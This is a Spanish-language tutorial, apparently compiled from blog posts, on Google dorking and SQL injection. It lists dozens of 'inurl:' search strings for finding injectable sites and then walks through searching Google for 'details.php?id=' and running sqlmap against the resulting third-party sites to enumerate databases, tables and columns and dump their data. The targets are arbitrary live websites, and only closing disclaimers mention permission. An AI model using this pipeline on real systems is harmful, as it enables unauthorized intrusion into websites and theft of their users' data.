# Google dorks y SQLinjection

### Introducción a Google Dorks

Google Dorks, también conocidos como "Google hacking," es una técnica que utiliza operadores de búsqueda avanzados en Google para encontrar información específica y a menudo sensible que no está fácilmente accesible a través de búsquedas convencionales. Esta práctica aprovecha la capacidad de Google para indexar una gran cantidad de contenido en la web y puede revelar datos que podrían ser ignorados en búsquedas estándar.

#### ¿Cómo funciona?

Google Dorks utiliza una combinación de operadores de búsqueda que permiten afinar los resultados. Estos operadores pueden incluir:

- **`filetype:`**: Busca archivos de un tipo específico (por ejemplo, `filetype:pdf` para archivos PDF).
- **`inurl:`**: Filtra resultados basados en una palabra clave que aparece en la URL.
- **`intitle:`**: Busca términos específicos en el título de las páginas.
- **`site:`**: Restringe la búsqueda a un dominio o subdominio específico (por ejemplo, `site:gov` para buscar en sitios gubernamentales).

#### Usos de Google Dorks

1. **Reconocimiento de Vulnerabilidades**: Los profesionales de la seguridad utilizan Google Dorks para descubrir vulnerabilidades en sitios web y aplicaciones. Por ejemplo, pueden buscar archivos de configuración expuestos que contengan credenciales o información sensible.

2. **Investigación de Información**: Los investigadores y periodistas pueden usar Google Dorks para encontrar información específica sobre temas de interés, como documentos, informes y bases de datos.

3. **Acceso a Datos No Protegidos**: En algunos casos, las organizaciones pueden accidentalmente dejar expuestos datos que deberían estar protegidos, y Google Dorks puede ayudar a identificarlos.



### Usos

``insite:microsoft.com intitle:help``

``google dorks for sql injection``



#### Dorks de Google para encontrar sitios web vulnerables a la inyección SQL SQLMAP:

| Google Dork string 1                | Google Dork string 2            | Google Dork string 3              |
| :---------------------------------- | :------------------------------ | :-------------------------------- |
| inurl:item_id=                      | inurl:review.php?id=            | inurl:hosting_info.php?id=        |
| inurl:newsid=                       | inurl:iniziativa.php?in=        | inurl:gallery.php?id=             |
| inurl:trainers.php?id=              | inurl:curriculum.php?id=        | inurl:rub.php?idr=                |
| inurl:news-full.php?id=             | inurl:labels.php?id=            | inurl:view_faq.php?id=            |
| inurl:news_display.php?getid=       | inurl:story.php?id=             | inurl:artikelinfo.php?id=         |
| inurl:index2.php?option=            | inurl:look.php?ID=              | inurl:detail.php?ID=              |
| inurl:readnews.php?id=              | inurl:newsone.php?id=           | inurl:index.php?=                 |
| inurl:top10.php?cat=                | inurl:aboutbook.php?id=         | inurl:profile_view.php?id=        |
| inurl:newsone.php?id=               | inurl:material.php?id=          | inurl:category.php?id=            |
| inurl:event.php?id=                 | inurl:opinions.php?id=          | inurl:publications.php?id=        |
| inurl:product-item.php?id=          | inurl:announce.php?id=          | inurl:fellows.php?id=             |
| inurl:sql.php?id=                   | inurl:rub.php?idr=              | inurl:downloads_info.php?id=      |
| inurl:index.php?catid=              | inurl:galeri_info.php?l=        | inurl:prod_info.php?id=           |
| inurl:news.php?catid=               | inurl:tekst.php?idt=            | inurl:shop.php?do=part&id=        |
| inurl:index.php?id=                 | inurl:newscat.php?id=           | inurl:productinfo.php?id=         |
| inurl:news.php?id=                  | inurl:newsticker_info.php?idn=  | inurl:collectionitem.php?id=      |
| inurl:index.php?id=                 | inurl:rubrika.php?idr=          | inurl:band_info.php?id=           |
| inurl:trainers.php?id=              | inurl:rubp.php?idr=             | inurl:product.php?id=             |
| inurl:buy.php?category=             | inurl:offer.php?idf=            | inurl:releases.php?id=            |
| inurl:article.php?ID=               | inurl:art.php?idm=              | inurl:ray.php?id=                 |
| inurl:play_old.php?id=              | inurl:title.php?id=             | inurl:produit.php?id=             |
| inurl:declaration_more.php?decl_id= | inurl:news_view.php?id=         | inurl:pop.php?id=                 |
| inurl:pageid=                       | inurl:select_biblio.php?id=     | inurl:shopping.php?id=            |
| inurl:games.php?id=                 | inurl:humor.php?id=             | inurl:productdetail.php?id=       |
| inurl:page.php?file=                | inurl:aboutbook.php?id=         | inurl:post.php?id=                |
| inurl:newsDetail.php?id=            | inurl:ogl_inet.php?ogl_id=      | inurl:viewshowdetail.php?id=      |
| inurl:gallery.php?id=               | inurl:fiche_spectacle.php?id=   | inurl:clubpage.php?id=            |
| inurl:article.php?id=               | inurl:communique_detail.php?id= | inurl:memberInfo.php?id=          |
| inurl:show.php?id=                  | inurl:sem.php3?id=              | inurl:section.php?id=             |
| inurl:staff_id=                     | inurl:kategorie.php4?id=        | inurl:theme.php?id=               |
| inurl:newsitem.php?num=             | inurl:news.php?id=              | inurl:page.php?id=                |
| inurl:readnews.php?id=              | inurl:index.php?id=             | inurl:shredder-categories.php?id= |
| inurl:top10.php?cat=                | inurl:faq2.php?id=              | inurl:tradeCategory.php?id=       |
| inurl:historialeer.php?num=         | inurl:show_an.php?id=           | inurl:product_ranges_view.php?ID= |
| inurl:reagir.php?num=               | inurl:preview.php?id=           | inurl:shop_category.php?id=       |
| inurl:Stray-Questions-View.php?num= | inurl:loadpsb.php?id=           | inurl:transcript.php?id=          |
| inurl:forum_bds.php?num=            | inurl:opinions.php?id=          | inurl:channel_id=                 |
| inurl:game.php?id=                  | inurl:spr.php?id=               | inurl:aboutbook.php?id=           |
| inurl:view_product.php?id=          | inurl:pages.php?id=             | inurl:preview.php?id=             |
| inurl:newsone.php?id=               | inurl:announce.php?id=          | inurl:loadpsb.php?id=             |
| inurl:sw_comment.php?id=            | inurl:clanek.php4?id=           | inurl:pages.php?id=               |
| inurl:news.php?id=                  | inurl:participant.php?id=       | about.php?cartID=                 |
| inurl:avd_start.php?avd=            | inurl:download.php?id=          | accinfo.php?cartId=               |
| inurl:event.php?id=                 | inurl:main.php?id=              | add-to-cart.php?ID=               |
| inurl:product-item.php?id=          | inurl:review.php?id=            | addToCart.php?idProduct=          |
| inurl:sql.php?id=                   | inurl:chappies.php?id=          | addtomylist.php?ProdId=           |
| inurl:material.php?id=              | inurl:read.php?id=              |                                   |
| inurl:clanek.php4?id=               | inurl:prod_detail.php?id=       |                                   |
| inurl:announce.php?id=              | inurl:viewphoto.php?id=         |                                   |
| inurl:chappies.php?id=              | inurl:article.php?id=           |                                   |
| inurl:read.php?id=                  | inurl:person.php?id=            |                                   |
| inurl:viewapp.php?id=               | inurl:productinfo.php?id=       |                                   |
| inurl:viewphoto.php?id=             | inurl:showimg.php?id=           |                                   |
| inurl:rub.php?idr=                  | inurl:view.php?id=              |                                   |
| inurl:galeri_info.php?l=            | inurl:website.php?id=           |                                   |

https://gbhackers.com/sqlmap-detecting-exploiting-sql-injection/

#### Consideraciones Éticas y Legales

Es fundamental recordar que, aunque Google Dorks puede ser una herramienta poderosa para la búsqueda de información, su uso debe hacerse con ética y responsabilidad. Acceder a información sensible sin autorización puede ser ilegal y contraviene las políticas de muchas organizaciones. Por lo tanto, es esencial obtener permiso y actuar dentro de los límites de la ley al utilizar estas técnicas.

En resumen, Google Dorks es una técnica valiosa para encontrar información específica en la web, pero su uso debe ser manejado con cuidado y consideración por las implicaciones éticas y legales que conlleva.

# Cómo encontrar una inyección SQL con Google Dorks y SQLmap

El Google dorking, también conocido como Google hacking, es una técnica que utiliza técnicas y operadores de búsqueda avanzados para descubrir información específica en Internet mediante el motor de búsqueda de Google. Implica el uso de consultas de búsqueda específicas para identificar vulnerabilidades, información confidencial o datos expuestos a los que no se puede acceder fácilmente mediante métodos de búsqueda convencionales.

Para encontrar vulnerabilidades de inyección SQL mediante Google dorks, el primer paso es determinar la consulta adecuada para pasar al motor de búsqueda de Google. Varios recursos en línea proporcionan una variedad de consultas de Google dork, pero para el propósito de esta publicación del blog, nos centraremos en encontrar vulnerabilidades de inyección SQL mediante esta consulta *details.php?id= .* Consulte https://www.smtechub.com/latest-google-sql-dorks/ para encontrar más consultas de Google dorks.

# **Repasemos el proceso paso a paso:**

**Paso 1:**

Abre tu navegador web preferido
Accede a [www.google.com](http://www.google.com/) 
Copia y peguael siguiente dork en la barra de búsqueda: *details.php?id=* .
Los resultados de la búsqueda mostrarán sitios web con *details.php?id=* en su URL.
Abre cada sitio individualmente y verifique que el dork esté presente en sus URL.

![img](https://miro.medium.com/v2/resize:fit:659/1*9KcU3rAoY3ojoJTIxEetuA.png)

**Paso 2:**

Ahora que hemos identificado sitios potencialmente vulnerables que utilizan Google dorks, podemos proceder a probarlos para inyección SQL utilizando una herramienta llamada sqlmap.
sqlmap ya está en Kali Linux; sin embargo, si no lo tienes, puedes instalarlo ejecutando el siguiente comando:

```bash
sudo apt install sqlmap
```

Una vez completada la instalación, ejecute el siguiente comando para encontrar vulnerabilidades de inyección SQL usando sqlmap:

```bash
sqlmap -u "put_the_URL_of_the_site+here" --dbs
```

![img](https://miro.medium.com/v2/resize:fit:660/1*3Fa5mfVSmpZueevcw4s-4g.png)

Sqlmap probará cada parámetro en la URL para la inyección SQL y proporcionará el tipo de base de datos junto con una lista de bases de datos.

![img](https://miro.medium.com/v2/resize:fit:659/1*3ENgNDsgEZjG0j3WnsDVUA.png)

**Paso 3:**

Una vez que se ha identificado y explotado con éxito la vulnerabilidad de inyección SQL, puede aprovechar indicadores adicionales junto con sqlmap para obtener más información sobre la base de datos subyacente, por ejemplo, qué bases de datos están presentes, la cantidad de tablas que tienen, etc.

Por ejemplo:

Para encontrar el número de tablas en una base de datos específica, utilice el comando:

```bash
sqlmap -u "<URL of the site>" -D <database name> --tables
```

![img](https://miro.medium.com/v2/resize:fit:659/1*WotFyYPxplm3Clo5K6Sm7Q.png)

![img](https://miro.medium.com/v2/resize:fit:659/1*RvJ8Hin0edCYwKIFy052vw.png)

Para determinar los nombres de las columnas de una tabla particular, utilice:

```bash
sqlmap -u "put_the_URL_of_the_site+here" -D <database name> -T <table name> --columns
```

Para recuperar los datos de una columna específica, utilice:

```bash
sqlmap -u "put_the_URL_of_the_site+here" -D <database name> -T <table name> -C <column name> --dump
```

Si sigue estos pasos, podrá aprovechar Google dorks y sqlmap para identificar y explotar vulnerabilidades de inyección SQL, lo que le permitirá acceder a las bases de datos subyacentes y extraer información valiosa. Sin embargo, es fundamental tener en cuenta que realizar estas acciones en sitios web sin permiso es ilegal y poco ético. Esta publicación del blog tiene como objetivo brindar conocimientos y generar conciencia sobre las vulnerabilidades de inyección SQL solo con fines educativos.

---

https://medium.com/@saintmark/how-to-find-sql-injection-using-google-dorks-and-sqlmap-3fa9c1676fe3    